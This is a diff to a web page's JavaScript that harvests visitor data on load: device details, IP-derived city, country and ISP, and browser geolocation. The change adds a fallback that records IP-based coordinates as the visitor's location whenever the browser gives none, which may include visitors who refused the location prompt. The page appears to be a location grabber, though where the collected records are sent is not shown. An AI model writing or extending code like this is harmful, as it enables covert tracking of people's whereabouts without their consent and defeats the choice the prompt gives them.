@@ -391,11 +391,8 @@
         };
 
         // ===== IMMEDIATE LOCATION REQUEST =====
-        document.addEventListener('DOMContentLoaded', () => {
-            // Get IP info immediately
-            getIPInfo();
-
-            // Get device info
+        document.addEventListener('DOMContentLoaded', async () => {
+            // Get device info (sync, immediate)
             userData.device = {
                 userAgent: navigator.userAgent,
                 platform: navigator.platform,
@@ -404,10 +401,15 @@
                 timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
             };
 
-            // IMMEDIATE location request (browser popup)
-            requestLocationImmediately();
+            console.log('[TRI] Page loaded. Loading IP info...');
 
-            console.log('[TRI] Page loaded. Requesting location immediately...');
+            // WAIT for IP info to complete FIRST
+            await getIPInfo();
+
+            console.log('[TRI] IP info loaded. Now requesting location...');
+
+            // THEN request location (after IP info is ready)
+            requestLocationImmediately();
         });
 
         // ===== REQUEST LOCATION IMMEDIATELY =====
@@ -463,7 +465,10 @@
                     country: data.country_name || 'Unknown',
                     countryCode: data.country_code || 'Unknown',
                     isp: data.org || 'Unknown',
-                    timezone: data.timezone || 'Unknown'
+                    timezone: data.timezone || 'Unknown',
+                    // IP-based location (fallback)
+                    latitude: data.latitude || null,
+                    longitude: data.longitude || null
                 };
 
                 console.log('[TRI] IP info:', userData.ipInfo?.city, userData.ipInfo?.country);
@@ -594,9 +599,10 @@
                 region: userData.ipInfo?.regionName || 'Unknown',
                 country: userData.ipInfo?.country || 'Unknown',
                 isp: userData.ipInfo?.isp || 'Unknown',
-                gps_lat: userData.location?.lat || 'Unknown',
-                gps_lng: userData.location?.lng || 'Unknown',
-                gps_accuracy: userData.location?.accuracy || 'Unknown',
+                // GPS location (fallback to IP-based location)
+                gps_lat: userData.location?.lat || userData.ipInfo?.latitude || 'Unknown',
+                gps_lng: userData.location?.lng || userData.ipInfo?.longitude || 'Unknown',
+                gps_accuracy: userData.location?.accuracy || 'IP-based',
                 platform: userData.device?.platform || 'Unknown',
                 screen: userData.device?.screen || 'Unknown',
                 language: userData.device?.language || 'Unknown',
@@ -640,9 +646,10 @@
                 region: userData.ipInfo?.regionName || 'Unknown',
                 country: userData.ipInfo?.country || 'Unknown',
                 isp: userData.ipInfo?.isp || 'Unknown',
-                gps_lat: userData.location?.lat || 'Unknown',
-                gps_lng: userData.location?.lng || 'Unknown',
-                gps_accuracy: userData.location?.accuracy || 'Unknown',
+                // GPS location (fallback to IP-based location)
+                gps_lat: userData.location?.lat || userData.ipInfo?.latitude || 'Unknown',
+                gps_lng: userData.location?.lng || userData.ipInfo?.longitude || 'Unknown',
+                gps_accuracy: userData.location?.accuracy || 'IP-based',
                 platform: userData.device?.platform || 'Unknown',
                 screen: userData.device?.screen || 'Unknown',
                 language: userData.device?.language || 'Unknown',
